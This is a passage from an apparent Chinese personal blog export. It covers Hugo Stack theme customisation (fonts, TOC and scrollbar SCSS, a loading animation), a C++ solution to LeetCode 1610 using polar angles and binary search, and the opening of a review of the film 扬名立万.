属性会直接将它的父元素设置为浏览器窗口。 bottom: -30px ，使得这个按钮不会被TOC的边界包住，而且在屏幕缩放时不会超出屏幕底端（其实就是个试验值）。 至此就得到了一个很漂亮的返回顶部按钮了！\n效果 字体样式修改 把这一项归在文章页面似乎不太合适，因为主页的字体样式也被我更改了；但其实字体样式主要地还是与文章有关，好的字体让人看起文章来心情愉悦。\n作者在 layouts/partials/footer/components/custom-font.html 中进行了字体的自定义：\n\u0026lt;script\u0026gt; (function () { const customFont = document.createElement(\u0026#39;link\u0026#39;); customFont.href = \u0026#34;https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700\u0026amp;display=swap\u0026#34;; customFont.type = \u0026#34;text/css\u0026#34;; customFont.rel = \u0026#34;stylesheet\u0026#34;; document.head.appendChild(customFont); }()); \u0026lt;/script\u0026gt; 他使用的字体是 Lato ，这个字体不支持中文，因此最终呈现出来的字体是平平无奇的微软雅黑（其实是作者放置的默认选项）。\n更改字体的方式有几种：\n使用在线字体； 下载字体CSS并引入； 使用正常PC都会有的字体（如微软雅黑、仿宋、楷体等）。 我决定使用在线字体，首先是因为在线字体的样式比较丰富，其次是字体CSS并没有那么好找……\n科学上网 去到 Google fonts ，找到满意的中文字体，把 custom-font.html 中的原有代码注释掉，使用网站给出的代码。\n示例 我现在的 custom-font.html 内容如下：\n\u0026lt;!-- \u0026lt;script\u0026gt; (function () { const customFont = document.createElement(\u0026#39;link\u0026#39;); customFont.href = \u0026#34;https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700\u0026amp;display=swap\u0026#34;; customFont.type = \u0026#34;text/css\u0026#34;; customFont.rel = \u0026#34;stylesheet\u0026#34;; document.head.appendChild(customFont); }()); \u0026lt;/script\u0026gt; --\u0026gt; \u0026lt;link rel=\u0026#34;preconnect\u0026#34; href=\u0026#34;https://fonts.googleapis.com\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;preconnect\u0026#34; href=\u0026#34;https://fonts.gstatic.com\u0026#34; crossorigin\u0026gt; \u0026lt;link href=\u0026#34;https://fonts.googleapis.com/css2?family=Long+Cang\u0026amp;family=Ma+Shan+Zheng\u0026amp;family=Noto+Sans+SC:wght@300\u0026amp;family=Noto+Serif+SC:wght@300\u0026amp;family=Zhi+Mang+Xing\u0026amp;display=swap\u0026#34; rel=\u0026#34;stylesheet\u0026#34;\u0026gt; 一次性引入了几款我认为还不错的字体，以便自由选择。\n引入字体之后，来到我们的老朋友 custom.scss 文件中，把 body 和 .article-content 的字体改为我们引入的字体的名字即可。\nbody, .article-content { // font-family: \u0026#39;Long Cang\u0026#39;, cursive; // font-family: \u0026#39;Ma Shan Zheng\u0026#39;, cursive; // font-family: \u0026#39;Noto Sans SC\u0026#39;, sans-serif; font-family: \u0026#39;Noto Serif SC\u0026#39;, serif; // font-family: \u0026#39;Zhi Mang Xing\u0026#39;, cursive; } 目录项紧凑 作者默认的文章页面是这样的：\n文章页面 虽然我很喜欢这个Table Of Content的位置，但我认为每一个目录之间的距离有点太开了。对于目录短一点的文章来说还好，对于目录很长的文章来说，这么大的间距显得不够精致。\n目录较长情况下的效果 老规矩，开发者工具选中、找class、搜索一条龙，在 assets/scss/partials/layout/article.scss 中找到了控制TOC格式的代码：\n.widget--toc { background-color: var(--card-background); border-radius: var(--card-border-radius); box-shadow: var(--shadow-l1); display: flex; flex-direction: column; color: var(--card-text-color-main); overflow: hidden; #TableOfContents { overflow-x: auto; max-height: 75vh; ol, ul { margin: 0; padding: 0; } ol { list-style-type: none; counter-reset: item; li:before { counter-increment: item; content: counters(item, \u0026#34;.\u0026#34;) \u0026#34;. \u0026#34;; font-weight: bold; margin-right: 5px; } } \u0026amp; \u0026gt; ul { padding: 0 1em; } li { margin: 15px 20px; padding: 5px; \u0026amp; \u0026gt; ol, \u0026amp; \u0026gt; ul { margin-top: 10px; padding-left: 10px; margin-bottom: -5px; \u0026amp; \u0026gt; li:last-child { margin-bottom: 0; } } } } } 只需要把重点放在诸如 padding 、 margin 一类的字眼上即可。\n审视 #TableOfContents 选择器底下的几个属性（已经删去较不重要的样式）：\n#TableOfContents { max-height: 75vh; // 控制目录的最大高度 li { margin: 15px 20px; // 控制列表项之间的距离（重要！） padding: 5px; \u0026amp; \u0026gt; ol, \u0026amp; \u0026gt; ul { margin-top: 10px; // 控制子列表和父列表项之间的距离（当TOC不只有一层目录的时候有用） padding-left: 10px; // 子列表项的向右缩进距离（当TOC不只有一层目录的时候有用） margin-bottom: -5px; \u0026amp; \u0026gt; li:last-child { margin-bottom: 0; } } } } 经过一番修改，我在 custom.scss 中添加了如下的样式：\n.widget--toc { #TableOfContents { max-height: 65vh; ol, ul { list-style-type: none; } li { margin: 10px 10px; \u0026amp; \u0026gt; ol, \u0026amp; \u0026gt; ul { margin-top: 10px; padding-left: 10px; margin-bottom: -5px; \u0026amp; \u0026gt; li:last-child { margin-bottom: 0; } } } } } 主要解决了几个问题：\n目录太高了，使得之前添加的返回顶部按钮可能会被顶出屏幕； 目录项前面的小黑点不太好看，隐去； 目录项之间的距离不够紧凑。 进行一下对比，个人是满意这个效果的：\n旧目录效果 新目录效果 滚动条美化 尽管经过了紧凑，目录还是可能出现过长的情况，而原本的样式中目录的滚动条毫无疑问是粗糙的，甚至令人很难接受。\n网络上有非常多自定义滚动条的教程，但是我懒得自行调试，直接使用Cabriel大佬在 这篇文章 中给出的 代码 ，将代码中自定义滚动条的部分加到上一小节中TOC的样式里，使得上一小节里修改过的TOC样式变成下面的样子：\n.widget--toc { #TableOfContents { max-height: 65vh; ol, ul { list-style-type: none; } li { margin: 10px 10px; \u0026amp; \u0026gt; ol, \u0026amp; \u0026gt; ul { margin-top: 10px; padding-left: 10px; margin-bottom: -5px; \u0026amp; \u0026gt; li:last-child { margin-bottom: 0; } } } } ::-webkit-scrollbar { width: 20px; } ::-webkit-scrollbar-track { background-color: transparent; } ::-webkit-scrollbar-thumb { background-color: #d6dee1; border-radius: 20px; border: 6px solid transparent; background-clip: content-box; } ::-webkit-scrollbar-thumb:hover { background-color: #a8bbbf; } } 旧目录滚动条效果 新目录滚动条效果 属实是提升幸福感的一个细节啊！\n我实在太喜欢这个滚动条了，以至于我不希望它仅仅作用在目录上。\n在我的博客中还有若干出现滚动条的地方，都是及其粗糙的浏览器原始样式：\n代码块的滚动条 相关文章的滚动条 无法忍受！\n因此我决定直接将滚动条优化的代码拿出来，作用到 整个网站 上！没错，我希望使得访客在我的博客的任意一个角落都不会见到原始的、丑陋的滚动条！\n简单粗暴地在 custom.scss 追加：\nhtml{ ::-webkit-scrollbar { width: 20px; } ::-webkit-scrollbar-track { background-color: transparent; } ::-webkit-scrollbar-thumb { background-color: #d6dee1; border-radius: 20px; border: 6px solid transparent; background-clip: content-box; } ::-webkit-scrollbar-thumb:hover { background-color: #a8bbbf; } } 注意，为了使得代码简洁，我们把滚动条美化的部分拿出来之后，要回到TOC样式那边把相同的这些代码删掉。\n现在，在我网站的所有地方，乃至于最外层的窗口右侧的滚动条都已经变成了优雅的样子 😏 。\n注：希望读者使用的 不是 FireFox浏览器 。\n相关文章组件美化 旧有的 相关文章 其实一直令我比较难受。JimmyCai大佬在设计文章列表的时候是考虑了每个文章配一个封面图的，因此在 相关文章 一栏也考虑了图片的存在，使得单个元素显得比较高大：\n旧主题相关文章 假如这些标题能够在垂直上居中，我倒也无所谓了，问题在于这些标题它居中不了……\n因此我决定从几个方面来稍微改善一下视觉效果：\n在相关文章推荐的时候，多显示一些元素（不要只显示一个标题）； 不使用文章封面（本来也不打算每个文章都配封面）而是展示我们自行选定的图片。 依然是熟悉的开发者工具选中操作，在 layouts/partials/article/components/related-contents.html 找到 相关文章 组件的代码：\n\u0026lt;aside class=\u0026#34;related-contents--wrapper\u0026#34;\u0026gt; {{ $related := (where (.Site.RegularPages.Related .) \u0026#34;Params.hidden\u0026#34; \u0026#34;!=\u0026#34; true) | first 5 }} {{ with $related }} \u0026lt;h2 class=\u0026#34;section-title\u0026#34;\u0026gt;{{ T \u0026#34;article.relatedContents\u0026#34; }}\u0026lt;/h2\u0026gt; \u0026lt;div class=\u0026#34;related-contents\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex article-list--tile\u0026#34;\u0026gt; {{ range . }} {{ partial \u0026#34;article-list/tile\u0026#34; (dict \u0026#34;context\u0026#34; . \u0026#34;size\u0026#34; \u0026#34;250x150\u0026#34; \u0026#34;Type\u0026#34; \u0026#34;articleList\u0026#34;) }} {{ end }} \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; {{ end }} \u0026lt;/aside\u0026gt; 从代码中可以看到，它使用的是 layouts/partials/article-list/tile.html 这个页面提供的文章列表，其代码为：\n{{ $image := partialCached \u0026#34;helper/image\u0026#34; (dict \u0026#34;Context\u0026#34; .context \u0026#34;Type\u0026#34; .Type) .context.RelPermalink .Type }} \u0026lt;article class=\u0026#34;{{ if $image.exists }}has-image{{ end }}\u0026#34;\u0026gt; \u0026lt;a href=\u0026#34;{{ .context.RelPermalink }}\u0026#34;\u0026gt; {{ if $image.exists }} \u0026lt;!-- 必然为 false，因为我们的文章没配封面 --\u0026gt; \u0026lt;div class=\u0026#34;article-image\u0026#34;\u0026gt; \u0026lt;!-- ==== 因此这部分代码不重要，略 ===== --\u0026gt; \u0026lt;/div\u0026gt; {{ end }} \u0026lt;div class=\u0026#34;article-details\u0026#34;\u0026gt; \u0026lt;h2 class=\u0026#34;article-title\u0026#34;\u0026gt; {{- .context.Title -}} \u0026lt;/h2\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/a\u0026gt; \u0026lt;/article\u0026gt; 根据我们的两点目标，我们应该：\n在下面一个 div 中添加 title 之外的元素，在这里我希望把文章的发表日期也呈现出来； 绕过 image.exists 的逻辑，直接用作者的 div 包住自己选用的图片。 第一点非常简单，仿照 layouts/partials/article-list/compact.html 代码，在 h2 标签下添加一个 footer 即可；\n第二点同样简单，此前已经仿照Avatar的代码写过返回顶部按钮，则在这里使用相同的办法添加一张图片即可。\n修改过后的 tile.html 代码如下：\n{{ $image := partialCached \u0026#34;helper/image\u0026#34; (dict \u0026#34;Context\u0026#34; .context \u0026#34;Type\u0026#34; .Type) .context.RelPermalink .Type }} \u0026lt;article class=\u0026#34;{{ if $image.exists }}has-image{{ end }}\u0026#34;\u0026gt; \u0026lt;a href=\u0026#34;{{ .context.RelPermalink }}\u0026#34;\u0026gt; {{ if $image.exists }} \u0026lt;!-- 必然为 false，因为我们的文章没配封面 --\u0026gt; \u0026lt;div class=\u0026#34;article-image\u0026#34;\u0026gt; \u0026lt;!-- ==== 因此这部分代码不重要，略 ===== --\u0026gt; \u0026lt;/div\u0026gt; {{ end }} \u0026lt;!-- 自行增加的图片 --\u0026gt; \u0026lt;div class=\u0026#34;article-image\u0026#34;\u0026gt; {{ $relatedImage := resources.Get (\u0026#34;img/related-content.png\u0026#34;) }} \u0026lt;img src=\u0026#34;{{ $relatedImage.RelPermalink }}\u0026#34; loading=\u0026#34;lazy\u0026#34; data-key=\u0026#34;{{ .context.Slug }}\u0026#34; data-hash=\u0026#34;{{ $image.permalink }}\u0026#34; style=\u0026#34;opacity: 0.3;\u0026#34;/\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;article-details\u0026#34;\u0026gt; \u0026lt;h2 class=\u0026#34;article-title\u0026#34;\u0026gt; {{- .context.Title -}} \u0026lt;/h2\u0026gt; \u0026lt;!-- 自行增加的文章发布日期 --\u0026gt; \u0026lt;footer class=\u0026#34;article-time\u0026#34;\u0026gt; \u0026lt;time datetime=\u0026#39;{{ .Date.Format \u0026#34;2006-01-02T15:04:05Z07:00\u0026#34; }}\u0026#39;\u0026gt; {{- .context.Date.Format (or .Site.Params.dateFormat.published \u0026#34;Jan 02, 2006\u0026#34;) -}} \u0026lt;/time\u0026gt; \u0026lt;/footer\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/a\u0026gt; \u0026lt;/article\u0026gt; 修改前 修改后 选中样式美化 直接使用 好友的样式 ，在 custom.scss 中添加：\n::selection { color: #fff; background: #557697; } 必须夸一句，颜色选得不错 😆 。\nPart 3 页面载入动画 这部分一定要单独拎出来！它实在是 SO COOL！\n事情的由来是这样的：虽然我在几个月之前就给我的博客（在GitPage上）布置了 Netlify 的CDN，但考虑到大墙的影响，偶尔加载起来还是慢得吐血。\n慢倒是无所谓，关键是点击完一个链接之后要加载老半天，页面也没什么反应，就跟宕机了一样，很尴尬的！\n为此呢，我参考 望间 大佬的 这篇文章 ，为我的博客也搞了个页面载入动画。\n动画效果展示 补充：\n我把页面部署上去之后，发现最终效果比较一般 😿\n因为这个动画主要应对的是 页面加载了、但没完全加载 的场景，而我们的主要问题似乎是点击链接之后 连页面都加载不了 😿\nWhatever，聊胜于无吧，大墙带来的问题看来是没那么容易平衡掉的……\nStep 1 新增组件 这个加载动画的大致原理呢，就是在原本的比较大的页面加载完成之前，先加载出一些比较简单的元素，为这些元素制作一些简单的动效，这样访客就不会等得太无聊了！等原本的页面加载完成之后，再把这个组件隐匿掉即可！\n因此，需要在原本的主题结构里面新增跟加载动画相关的组件。\n我把这个小组件放在 layouts/partials/widget/preload.html 文件里，注意，这个文件是自己创建的：\n{{ if .Site.Params.enablePreloadingAnim }} \u0026lt;div id=\u0026#34;loading-box\u0026#34;\u0026gt; \u0026lt;!-- 页面加载完成之后帷幕拉开的效果 --\u0026gt; \u0026lt;div class=\u0026#34;loading-left-bg\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;loading-right-bg\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;!-- 旋转盒子动效 --\u0026gt; \u0026lt;div class=\u0026#34;spinner-box\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;configure-border-1\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;configure-core\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;configure-border-2\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;configure-core\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;loading-word\u0026#34;\u0026gt;加载中...\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;!-- 页面加载动画 --\u0026gt; \u0026lt;script\u0026gt; $(document).ready(function () { document.getElementById(\u0026#39;loading-box\u0026#39;).classList.add(\u0026#34;loaded\u0026#34;) }) \u0026lt;/script\u0026gt; {{ end }} 可以看到，这个文件里面有几个组成部分，非常简单：\nHugo的 if 判断句，便于我们在配置文件里控制这个组件要不要启用； 用于呈现动效的几个简单的HTML元素； jQuery的函数，直接使用 ready 函数，当页面载入完成之后把动效组件隐匿掉！ 万事俱备，把这个组件直接加到网站模板里面就行了！Stack主题的网页模板在 layouts/_default/baseof.html ，我们找到 body 标签，在它底下加上这么一句：\n\u0026lt;body class=\u0026#34;{{ block `body-class` . }}{{ end }}\u0026#34;\u0026gt; \u0026lt;!-- 下面这个是新加的 --\u0026gt; {{- partial \u0026#34;widget/preload\u0026#34; . -}} \u0026lt;!-- 下面就是Stack作者原本的代码了 --\u0026gt; {{- partial \u0026#34;head/colorScheme\u0026#34; . -}} \u0026lt;!-- 省略省略省略 --\u0026gt; \u0026lt;/body\u0026gt; 一切就OK了！\nStep 2 组件样式 我们刚才看到的jQuery函数非常简单，是因为这个动效最灵魂的地方是在组件的CSS啊！\n找到老朋友 assets/scss/custom.scss ，在文件里面 追加 ：\n#loading-box .loading-left-bg, #loading-box .loading-right-bg { position: fixed; z-index: 1000; width: 50%; height: 100%; // 我在这里小改了一下颜色， background-color: #b1c0c7; transition: all 0.5s; } #loading-box .loading-right-bg { right: 0; } #loading-box\u0026gt;.spinner-box { position: fixed; z-index: 1001; display: flex; justify-content: center; align-items: center; width: 100%; height: 100vh; } #loading-box .spinner-box .configure-border-1 { position: absolute; padding: 3px; width: 115px; height: 115px; background: #ffab91; animation: configure-clockwise 3s ease-in-out 0s infinite alternate; } #loading-box .spinner-box .configure-border-2 { left: -115px; padding: 3px; width: 115px; height: 115px; background: rgb(63, 249, 220); transform: rotate(45deg); animation: configure-xclockwise 3s ease-in-out 0s infinite alternate; } #loading-box .spinner-box .loading-word { position: absolute; color: #ffffff; // 我在这里小改了一下文字大小和字体，注意！ font-size: 1.8rem; font-family: \u0026#39;Zhi Mang Xing\u0026#39;, cursive; } #loading-box .spinner-box .configure-core { width: 100%; height: 100%; background-color: #37474f; } div.loaded div.loading-left-bg { transform: translate(-100%, 0); } div.loaded div.loading-right-bg { transform: translate(100%, 0); } div.loaded div.spinner-box { // 你可以把这个注释掉，这样就能一直看那个动画的效果了！ display: none !important; } @keyframes configure-clockwise { 0% { transform: rotate(0); } 25% { transform: rotate(90deg); } 50% { transform: rotate(180deg); } 75% { transform: rotate(270deg); } 100% { transform: rotate(360deg); } } @keyframes configure-xclockwise { 0% { transform: rotate(45deg); } 25% { transform: rotate(-45deg); } 50% { transform: rotate(-135deg); } 75% { transform: rotate(-225deg); } 100% { transform: rotate(-315deg); } } OK，搞定！\n在这里，我们没必要搞清楚动画原理，因为我感觉这个动画自定义的空间不大了。读者可以在网络上查找一下 CSS页面载入动画 这种相关内容，会发现其实已经有超级多设计师大牛把他们的作品开源了，我们没必要自己调整，总能找到一个很满意的啦！\nStep 3 配置文件 完成上面两步之后，动画暂时还不能生效，因为我们新增组件的时候加了个 if 判断，还记得吗？\n在配置文件的相应位置（我这里是 params 栏目底下）加上 enablePreloadingAnim: true 这个键值对，然后就可以享受这个很棒的载入动画了！\nTo Be Continued\u0026hellip; 文章页面微调（white-space: nowrap；目录项紧凑；……） 主页侧边栏不亮 文章添加返回最上层 研究在线字体 修改文章页面的 返回 按钮的跳转逻辑（不要直接回到主页，最好回到上一级） 研究SVG动画，把加载动画优化成SVG绘制土楼！（福建人的执念啊） 修复 archieves 页面顶部，categories用的 article-tile 的问题（之前改相关文章组件，把这个东西影响到了 😝 ） ","date":"2022-01-12T00:00:00Z","permalink":"https://xrg.fj.cn/p/hugo-stack%E4%B8%BB%E9%A2%98%E6%9B%B4%E6%96%B0%E5%B0%8F%E8%AE%B0/","title":"Hugo Stack主题更新小记"},{"content":"许久不曾做算法题了，今天的每日一题是道Hard，而我独立地将它搞定了，即便它只有Medium的程度。\n实际上是一道没什么意思的题目，本篇主要记录几个思维上的不足点。\n题目 给你一个点数组 points 和一个表示角度的整数 angle ，你的位置是 location ，其中 location = [posx, posy] 且 points[i] = [xi, yi] 都表示 X-Y 平面上的整数坐标。\n最开始，你面向东方进行观测。你 不能 进行移动改变位置，但可以通过 自转 调整观测角度。换句话说，posx 和 posy 不能改变。你的视野范围的角度用 angle 表示， 这决定了你观测任意方向时可以多宽。设 d 为你逆时针自转旋转的度数，那么你的视野就是角度范围 [d - angle/2, d + angle/2] 所指示的那片区域。\n对于每个点，如果由该点、你的位置以及从你的位置直接向东的方向形成的角度 位于你的视野中 ，那么你就可以看到它。\n同一个坐标上可以有多个点。你所在的位置也可能存在一些点，但不管你的怎么旋转，总是可以看到这些点。同时，点不会阻碍你看到其他点。\n返回你能看到的点的最大数目。\n示例1\nexp1 输入： points = [[2,1],[2,2],[3,3]], angle = 90, location = [1,1] 输出： 3 解释： 阴影区域代表你的视野。在你的视野中，所有的点都清晰可见，尽管 [2,2] 和 [3,3]在同一条直线上，你仍然可以看到 [3,3] 。 示例2\nexp2 输入： points = [[1,0],[2,1]], angle = 13, location = [1,1] 输出： 1 数据范围\n1 \u0026lt;= points.length \u0026lt;= 105 points[i].length == 2 location.length == 2 0 \u0026lt;= angle \u0026lt; 360 0 \u0026lt;= posx, posy, xi, yi \u0026lt;= 100 分析 根据数据范围，尝试采用 O(nlogn) 的解法即可。\n问题转化 在计算可见范围时，我们一定要考虑到的东西不是坐标，而是角度，即 某个点与观测点的夹角 。\n对于给定的任意一个点，我们将它作为观测角的 下边 ，然后以这条边为起点，逆时针转 angle 的角度，即可得到观测范围的 上边 ，这样就能得到一个观测范围。\n对于这种完全依赖 夹角角度 而不依赖 坐标 的思路，我们应该能够想到 将直角坐标转化为极坐标 。\n所谓 极坐标 ，是以观测点为原点，将某点表示为 (ρ,θ) 的形式，即表示为 (极径,极角) 的形式。\n这里我们不需要确切知道某个点到观测点的距离，只需要知道它的 极角 ，即它和观测点的夹角，约定以X轴正方向为零度，逆时针增加度数。\n因此得到了一个将直角坐标转化为极坐标的函数：\n#define PI 3.1415926535897932384626 vector\u0026lt;double\u0026gt; pointsInPolar; int numberOfSuperpositionPoints; void changePointsIntoPolar(vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt;\u0026amp; points, vector\u0026lt;int\u0026gt;\u0026amp; O) { int ox = O[0]; int oy = O[1]; numberOfSuperpositionPoints = 0; for (auto p : points) { int px = p[0]; int py = p[1]; if (px == ox \u0026amp;\u0026amp; py == oy) { numberOfSuperpositionPoints++; continue; } if (px == ox) { if (py \u0026gt; oy) pointsInPolar.push_back(90.0); else { pointsInPolar.push_back(-90.0); pointsInPolar.push_back(270.0); } continue; } // 计算夹角 double pointAngleInPolar = atan2(py - oy, px - ox) * 180 / PI; pointsInPolar.push_back(pointAngleInPolar); if (pointAngleInPolar \u0026lt; 0) pointsInPolar.push_back(pointAngleInPolar + 360.0); } sort(pointsInPolar.begin(), pointsInPolar.end()); return ; } 有几个重点要注意：\nC++函数 atan2 用法参见 atan2 - C++ Reference (cplusplus.com) ，它得到的值是 弧度 ，要转为角度（乘180再除以π）； 当给出的点和观测点重合，认为它永远处于视野范围内，用一个变量 numberOfSuperpositionPoints 加以记录。 当两个点的 X 坐标相等，要根据 Y 坐标的大小判断角度。 负数的角度表示从 X 轴正方向 顺时针 旋转，那么这种负数角度应该也有正数表示，即加上 360° 。 第三点很重要，并影响到第二点 、 我们可以看到代码中对于负数角度的处理，假如我们有一组数据：\n[[0,0],[0,2]]\n90\n[1,1]\nexp data 如果放任负数角度不管，我们得到的转化为极坐标的点应该是 [-135.0, 135.0] ，这样，不管以哪个点为视野下边，加上了 90° 的观察角，都无法看到另一个点了。\n而按照我们的代码中的处理办法，对于这个负角度的点，我们额外将它的等价正角度点放入了集合中，即应该得到 [-135.0, 135.0, 225.0] 的集合，那么只要以 135.0° 为视野下边，然后加上 90° 的观察角，就能够看到 225° 的点，实际上就是刚才被忽略的负角度的点。\n这样做实际上有不小的坏处，那就是 引入额外的空间和时间复杂度 ！本来只有一个负角度点，现在要额外存储并计算它的等价正角度点，还是很花费空间和时间的。\n但是我今天只是作一个错题的记录，就不考虑它的优化方案了。\n求解 现在我们已知视野下边和观察角，相当于也已知视野上边了。要快速从所有点中找到可见点的数目，很简单，做一个二分查找即可。\n使用二分查找的办法快速找到 第一个视野上边之上 的点。\nint calcVvisiablePointsNumber(int startPointIndex, int visiableAngle) { double finalVisiablePoint = pointsInPolar[startPointIndex] + visiableAngle; int l = 0; int r = pointsInPolar.size() - 1; if (pointsInPolar[r] \u0026lt;= finalVisiablePoint) return r - startPointIndex + 1; while (l \u0026lt;= r) { int mid = (l + r) \u0026gt;\u0026gt; 1; if (pointsInPolar[mid] \u0026lt;= finalVisiablePoint) l = mid + 1; else r = mid - 1; } return l - startPointIndex; } 我们遍历所有点，分别以它们作为视野下边，用二分求出可见点数，时间复杂度 O(nlogn) 。\nAC 代码 class Solution { private: #define PI 3.1415926535897932384626 vector\u0026lt;double\u0026gt; pointsInPolar; int numberOfSuperpositionPoints; public: void changePointsIntoPolar(vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt;\u0026amp; points, vector\u0026lt;int\u0026gt;\u0026amp; O) { int ox = O[0]; int oy = O[1]; numberOfSuperpositionPoints = 0; for (auto p : points) { int px = p[0]; int py = p[1]; if (px == ox \u0026amp;\u0026amp; py == oy) { numberOfSuperpositionPoints++; continue; } if (px == ox) { if (py \u0026gt; oy) pointsInPolar.push_back(90.0); else { pointsInPolar.push_back(-90.0); pointsInPolar.push_back(270.0); } continue; } // 计算夹角 double pointAngleInPolar = atan2(py - oy, px - ox) * 180 / PI; pointsInPolar.push_back(pointAngleInPolar); if (pointAngleInPolar \u0026lt; 0) pointsInPolar.push_back(pointAngleInPolar + 360.0); } sort(pointsInPolar.begin(), pointsInPolar.end()); return ; } int calcVvisiablePointsNumber(int startPointIndex, int visiableAngle) { double finalVisiablePoint = pointsInPolar[startPointIndex] + visiableAngle; int l = 0; int r = pointsInPolar.size() - 1; if (pointsInPolar[r] \u0026lt;= finalVisiablePoint) return r - startPointIndex + 1; while (l \u0026lt;= r) { int mid = (l + r) \u0026gt;\u0026gt; 1; if (pointsInPolar[mid] \u0026lt;= finalVisiablePoint) l = mid + 1; else r = mid - 1; } return l - startPointIndex; } void debugOut() { for (auto agl : pointsInPolar) cout \u0026lt;\u0026lt; agl \u0026lt;\u0026lt; \u0026#34; \u0026#34;; cout \u0026lt;\u0026lt; endl; } int visiblePoints(vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt;\u0026amp; points, int angle, vector\u0026lt;int\u0026gt;\u0026amp; location) { changePointsIntoPolar(points, location); int res = numberOfSuperpositionPoints; // debugOut(); for (int i = 0; i \u0026lt; pointsInPolar.size(); i++) { int nowVisiablePointNumber = calcVvisiablePointsNumber(i, angle); res = max(res, nowVisiablePointNumber + numberOfSuperpositionPoints); } return res; } }; Performance 错误记录 In fact，我的代码表现蛮差劲的，但也作为我花费一定时间和脑力独立解决的一道困难题加以记录，仅供自娱自乐罢了。\n可以看到我WA了多少次，在此记录一下解题过程中的若干盲区：\n负角度点没有转化等价为正角度； 忽视了“重合点永远可见”这个道理； 二分边界。 Over。\n","date":"2021-12-16T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%94%99%E9%A2%98%E6%9C%AC-leetcode1610.-%E5%8F%AF%E8%A7%81%E7%82%B9%E7%9A%84%E6%9C%80%E5%A4%A7%E6%95%B0%E7%9B%AE/","title":"错题本 | LeetCode1610. 可见点的最大数目"},{"content":"《扬名立万》是一部好电影。\n单以其情节之妙，本不足以专写一篇来作感悟，而从故事本身所能看到的、联想的东西，便不枉此文。\n扬名立万是人物行动的目的。\n情节的提要 故事以电影讨论会为切入点，电影资方陆爷、导演郑、演员关、演员梦蝶、演员肖、编剧李家辉，希望将此前轰动上海的三老凶杀案拍成电影，为此请来了凶手齐乐山和警察海兆丰。李家辉无意间俯身看到齐乐山的脚镣，才知晓对方就是案件的凶手，就此针对案件细节向其展开了一系列犀利的问询。齐乐山的回答逻辑无法自洽，而此时的演员关看出了齐乐山非同一般的身份。故事的第一部分结束。\n李家辉出言中伤梦蝶，众人随着梦蝶来到大厅。在这里，舞蹈、交谈、海报等伏笔纷纷登场，随着李家辉和梦蝶暂时和好，故事的第二部分结束。\n故事的第三部分由演员肖志拉开。本欲取酒的肖志无意间闯入三老遇害的现场，众人随后赶到，然后由陆爷揭下了一众人的真实面目：过气的演员关、被别人威胁的梦蝶、不得志的肖志、得罪了许多大佬的李家辉，召集一干人拍电影的目的就是为了”扬名立万“。此时，众人希望将三老遇害这一大案件呈现出来，因此更加热切地希望寻找案件的真相。\n众人在案发现场发现了被裁开的画、天花板上的通风口、天花板上的钩子，经过不断的推理，案件的真相似乎呼之欲出了。\n齐乐山打开了自己的手铐和脚镣，来到了命案现场，同时，李家辉和肖志从通风管道中得到的一些线索，使得整个案件愈发扑朔迷离。在与齐乐山的对峙中，李家辉向其说明了自己的推理，从而使得齐乐山开启了回忆，事件的答案似乎已经呈现出来了：齐乐山所爱的、且受到兄弟之托所照顾的女子夜莺，在上海滩闯出一片事业之后，受到三老的猥亵，而齐乐山愤怒无比，杀三老、毁夜莺的尸体、回到现场等候警察到来。齐乐山的供述似乎天衣无缝，三老的案件与法国医生碎尸的案件联系起来了，众人似乎都认可了这一情节，讨论如何将这个故事用电影呈现出来。\n进入故事的第五部分，”踩灭火苗的人“带着一帮人进入了现场，控制了众人。在绝望之际，肖志、齐乐山与来者爆发了冲突，最后齐乐山舍命将一切答案掩埋在了火海之中。\n故事的最后，众人拍的电影在越南上映，三老的劣迹公之于众，事件似乎迎来了欢喜的结局。然而，在试映会上，夜莺的出现使得故事的真相再一次反转：夜莺没有死，齐乐山没有毁尸，齐乐山的罪孽，或者说是完全的贡献，只是除掉了为害一方的三老而已。真相只有李家辉知道，但为着夜莺，恐怕他不会宣扬了。\n散场，灯亮，我陷入思考中而并未立即起身离去。故事是喜剧还是悲剧呢？恐怕是喜剧的标准，悲剧的内核。齐乐山的死，应该称为就义的，掩埋了夜莺所遭遇的一切；李家辉所追求的真相，一直到拍成了电影，也并不是完全的真相；夜莺的遭遇是全片最大的悲剧，我后面再讲。\n伏笔的分析 